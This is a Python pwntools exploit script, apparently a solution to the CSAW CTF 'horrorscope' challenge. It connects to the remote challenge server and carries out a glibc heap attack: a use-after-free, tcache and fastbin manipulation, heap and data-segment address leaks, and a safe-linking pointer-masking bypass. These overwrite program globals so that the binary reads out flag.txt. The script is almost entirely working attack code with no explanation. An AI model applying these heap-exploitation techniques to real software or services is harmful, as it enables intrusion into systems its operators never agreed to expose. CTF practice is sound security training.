#!/usr/bin/python3

from pwn import *
import binascii

DEBUG = False
LOCAL = False

def exploit():
  def binary_connect():
    if LOCAL:
      if DEBUG:
        return gdb.debug('./horrorscope', '''
            b print_scope
            continue
        ''')
      else:
        return process('./horrorscope')
    else:
      return remote('pwn.chal.csaw.io', 5010)

  def sign(input):
    p.send(b'0\n')
    p.recvuntil(b"sign\n > ")
    p.send(input + b'\n')
    return p.recvuntil(b' > ')

  def eightball(input, save):
    p.send(b'1\n')
    p.recvuntil(b"8 ball\n > ")
    p.send(input + b'\n')
    resp = p.recvuntil(b'\n')
    p.recvuntil(b' > ')
    p.send(save.encode('utf-8') + b'\n')
    p.recvuntil(b' > ')
    return resp

  def cookie():
    p.send(b'2\n')
    resp = p.recvuntil(b'\n')
    p.recvuntil(b' > ')
    return resp

  def read_8ball(index):
    p.send(b'3\n')
    p.recvuntil(b' > ')
    p.send(str(index).encode('utf-8') + b'\n')
    return p.recvuntil(b' > ')
      
  def read_cookie(index):
    p.send(b'4\n')
    p.recvuntil(b' >')
    p.send(str(index).encode('utf-8') + b'\n')
    return p.recvuntil(b' > ')

  def delete_8ball():
    p.send(b'5\n')
    return p.recvuntil(b' > ')

  def get_lucky_num(input): 
    p.send(b'7\n')
    p.recvuntil(b' > ')
    p.send(input + b'\n')
    p.recvuntil(b' > ')

  def store_lucky_num(first, input, delete):
    p.send(b'8\n')
    if first:
      p.recvuntil(b' > ')
      p.send(input + b'\n')
      p.recvuntil(b' > ')
    else:
      p.recvuntil(b' > ')
      if delete:
        p.send(b'N\n')
        p.recvuntil(b' > ')
        p.send(b'Y\n')
      else:
        p.send(b'Y\n')
      p.recvuntil(b' > ')


  # exploit begins here 
  p = binary_connect()
  p.recvuntil(b'> ')
  
  # fill cookie list
  for i in range(0, 0x21):
    cookie()

  # fill 0x80 tcache
  for _ in range(0, 8):
    eightball(b"flag.txt\0", 'Y')

  for _ in range(0, 7):
    delete_8ball()  

  # fill one entry in fastbins
  # unnecessary for 2.34 exploit (necessary for < 2.32)
  # delete_8ball()

  # free UAF with link in fastbins
  resp = cookie()
  assert resp == b' You have no room to save any more fortunes. Please choose one to delete\n'
  p.send(b'0\n')
  p.recvuntil(b' > ')

  # leak heap address
  leak = int.from_bytes(read_cookie(0)[2:7], "little")
  print(hex(leak))
  heap_start = leak << 12
  print(hex(heap_start))

  assert (heap_start & 0xfff) == 0 

  # alloc UAF into 8ball and fill up to the data segment address, read fortune to leak data address
  for _ in range(0, 7):
    eightball(b"flag.txt\0", 'Y')
  eightball(b"A" * (0x68 - 17), 'Y')
  leak = read_8ball(8)
  rough_leak = int.from_bytes(b'\x00' + leak.split(b'\n')[1][:], "little")
  data_base = rough_leak & ~0xfff
  global_addr = data_base + 0x20
  print(hex(global_addr))

  # fill last index in cookie array
  resp = cookie()

  # empty fastbins and refill tcaches (0x20 and 0x80)
  # unnecessary for 2.34 exploit (necessary for < 2.32)
  # eightball(b"flag.txt\0", 'Y')
  # eightball(b"flag.txt\0", 'Y')
  for _ in range(0, 7):
    delete_8ball()
    store_lucky_num(True, b'4', False)
    store_lucky_num(False, b'', True)

  # alloc and free UAF in last index
  resp = cookie()
  assert resp == b' You have no room to save any more fortunes. Please choose one to delete\n'  
  p.send(b'32\n')
  p.recvuntil(b' > ')

  # consolidate to push UAF chunk into unsorted bins
  p.send(b'1' * 0x600 + b'\n')

  # free UAF in index 32 to populate fastbins pointers, alloc UAF from unsorted bins into sign
  delete_8ball()
  sign(b'Aries')

  # free sign using UAF into 0x20 fastbins 
  resp = cookie()
  assert resp == b' You have no room to save any more fortunes. Please choose one to delete\n'  
  p.send(b'32\n')
  p.recvuntil(b' > ')

  # edit sign (UAF), make sure to mask pointer
  dest = global_addr
  source = heap_start + 0x1720 # location on heap of globals.sign
  masked_global_addr = dest ^ (source >> 12)
  sign(masked_global_addr.to_bytes(8,"little"))
  
  # alloc trash 
  store_lucky_num(True, b'4', False)

  # overwrite globals 
  flag_addr = heap_start + 0x1331
  file_lines = 1
  get_lucky_num(flag_addr.to_bytes(8,"little") + file_lines.to_bytes(3, "little"))

  print(hex(flag_addr))

  # consult oracle
  p.send(b'6\n')
  resp = p.recvuntil(b' > ')
  print(resp[:resp.find(b'\n')])

if __name__ == "__main__":
  context.log_level = "debug"
  exploit()
